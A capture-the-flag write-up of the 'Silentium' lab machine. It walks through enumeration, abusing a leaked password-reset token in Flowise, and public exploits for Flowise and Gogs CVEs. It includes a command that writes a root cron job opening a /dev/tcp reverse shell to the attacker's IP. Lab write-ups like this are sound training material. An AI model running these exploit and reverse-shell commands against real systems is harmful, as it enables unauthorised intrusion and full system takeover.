# Silentium

> **Difficulty:** Easy  
> **Operating System:** Linux

---

## Initial Enumeration

As always, we start with some basic enumeration.

```bash
nmap -sV -sC 10.129.17.183

echo "10.129.17.183 silentium.htb" | sudo tee -a /etc/hosts
```

![](images/Pasted%20image%2020260804162701.png)

The scan reveals two open ports:

- **22 (SSH)**
- **80 (HTTP)**

Heading over to the website, nothing immediately stands out except a few employee names that may become useful later if we need valid usernames.

- Marcus Throne
- Ben
- Elena Rossi

![](images/Pasted%20image%2020260804162900.png)

Directory busting doesn't reveal anything interesting.

```bash
gobuster dir -u http://silentium.htb \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 8753
```

![](images/Pasted%20image%2020260804162952.png)

Virtual host enumeration, however, is much more fruitful.

```bash
gobuster vhost -u https://silentium.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
It discovers a **staging** subdomain.

![](images/Pasted%20image%2020260804162929.png)

After adding it to **/etc/hosts**, we browse to it and are presented with a sign-in page.

![](images/Pasted%20image%2020260804163122.png)

---

## Foothold

Clicking **Forgot Password**, we notice something interesting.

Submitting a random username returns a response indicating that the user doesn't exist. That means the application is checking whether the supplied username is valid before attempting the password reset.

![](images/Pasted%20image%2020260804163246.png)

Since we already collected the username **Ben** from the main website, it's reasonable to assume his email follows the company's naming convention, something like:

```text
ben@silentium.htb
```

Instead of interacting with the application normally, let's capture the request with **Burp Suite** so we can inspect both the request and the response.

And indeed...

![](images/Pasted%20image%2020260804163542.png)

The email exists.

Now we send the request to **Repeater** to inspect the server's response more closely.

![](images/Pasted%20image%2020260804164741.png)

The response contains a temporary reset token named **tempToken**.

This token is enough to reset Ben's password by visiting:

```
http://staging.silentium.htb/reset-password
```

> **Note:** Once you've captured the reset request and sent it to **Repeater**, don't forward or drop the intercepted request in Burp. Leave it intercepted, switch back to your normal browser, and complete the password reset there while Burp is still holding the original request. This allows the reset flow to complete successfully.

![](images/Pasted%20image%2020260804164847.png)

After changing the password, we can successfully log in as **Ben**.

![](images/Pasted%20image%2020260804165022.png)

The first thing worth checking is the application's version.

Opening the menu in the top-right corner and clicking **Version** reveals:

![](images/Pasted%20image%2020260804165116.png)

The application is running **Flowise AI 3.0.5**.

A quick search shows that this version is affected by **CVE-2025-59528**, a Remote Code Execution vulnerability.

![](images/Pasted%20image%2020260804165309.png)

Searching GitHub quickly leads us to a working proof of concept:

[https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC/blob/master/main.py](https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC/blob/master/main.py)

Running the exploit is straightforward.

```bash
python3 main.py --module rce -u http://staging.silentium.htb -e ben@silentium.htb -P YOUR_PASSWORD --lhost YOUR_IP --lport 4444

#And open a listening port obviously
nc -lvnp 4444
```

![](images/Pasted%20image%2020260804170351.png)

The exploit succeeds immediately.

Interestingly, the shell lands us as **root**.
....but only inside a Docker container.

We can quickly confirm this by noticing the presence of the **.dockerenv** file.

Escaping containers isn't always straightforward, so before looking for escape vectors, it's worth enumerating the environment and seeing whether the developers accidentally left anything useful behind.

Running:

```bash
env
```

turns out to be exactly what we needed.

![](images/Pasted%20image%2020260804175701.png)

Among the environment variables we recover Ben's credentials.

Using them over SSH gives us a proper shell on the host.

![](images/Pasted%20image%2020260804175919.png)

Now we can retrieve the user flag.

![](images/Pasted%20image%2020260804180211.png)

---

## Privilege Escalation

After performing the usual Linux enumeration—checking **SUID binaries**, **capabilities**, **cron jobs**, **sudo permissions**, and so on—nothing obvious appears.

The next thing worth checking is locally listening services.

```bash
ss -tulpn
```

![](images/Pasted%20image%2020260804180330.png)

There are quite a few.

Rather than randomly picking one, let's simply work through them from top to bottom.

The service listening on **localhost:3000** turns out to be the same website hosted on **silentium.htb**.

```bash
curl 127.0.0.1:3000 -sI

curl 127.0.0.1:3000 -s
```

![](images/Pasted%20image%2020260804180657.png)

Nothing new there.

Moving on to **port 3001**:

```bash
curl 127.0.0.1:3001 -sI

curl 127.0.0.1:3001 -s
```

![](images/Pasted%20image%2020260804180926.png)

Now that's interesting.

The response reveals a **Gogs** service.

Since it's only accessible locally, we'll need to forward the port to our own machine using **Chisel**.
Before doing that, it's worth checking whether we can learn anything about the service from the running processes.

Searching for **gogs** or **3001** confirms that it's running as **root**.

![](images/Pasted%20image%2020260804181028.png)

Another interesting detail appears in the response headers.

```
Domain=staging-v2-code.dev.silentium.htb;
```

![](images/Pasted%20image%2020260804183240.png)

So no need for chisel we can simply add the subdomain to **/etc/hosts** and we will be able to access it through our browser.
After adding the domain to **/etc/hosts**, we browse to it.

![](images/Pasted%20image%2020260804183334.png)

It's a self-hosted **Gogs** Git service.

Ben's credentials don't work here, so we simply register a new account.

![](images/Pasted%20image%2020260804183624.png)

After signing in:

![](images/Pasted%20image%2020260804183847.png)

we spend a few minutes looking around, but nothing particularly useful appears—not even the application's version.

A quick search for known Gogs vulnerabilities eventually leads us to **CVE-2025-8110**, affecting version **0.13**.

![](images/Pasted%20image%2020260804184610.png)

Searching GitHub reveals a working proof of concept:

[https://github.com/3jee/CVE-2025-8110/blob/main/CVE-2025-8110.py](https://github.com/3jee/CVE-2025-8110/blob/main/CVE-2025-8110.py)

Running the exploit is as simple as:

```bash
#Change the IP to yours!
python3 CVE-2025-8110.py --url http://staging-v2-code.dev.silentium.htb -u test -p Password1! --target-file /etc/crontab  --content '* * * * * root bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'

# and open a listening port.
nc -lvnp 4444
```

![](images/Pasted%20image%2020260804185247.png)

Within a minute, the cron job executes and we receive a **root** shell.

All that's left is retrieving the final flag.

```bash
cat /root/root.txt
```

![](images/Pasted%20image%2020260804185408.png)

> **Note:** The approach above is the intended path. However, after obtaining Ben's SSH credentials, running **LinPEAS** would also reveal that the machine is vulnerable to **Pack2TheRoot**, providing an alternative route to root.

![](images/Pasted%20image%2020260804185709.png)

---

## Conclusion

This was a fun Easy machine that mainly rewarded good enumeration rather than complicated exploitation.
The Docker container added a nice twist, and it was a good reminder that **environment variables should never be overlooked**, as they often contain sensitive information such as API keys, passwords, or tokens.
I also liked that checking the local listening ports from top to bottom eventually led us to the intended privilege escalation path instead of chasing rabbit holes if we started from the bottom xD.

**— 0xchnk**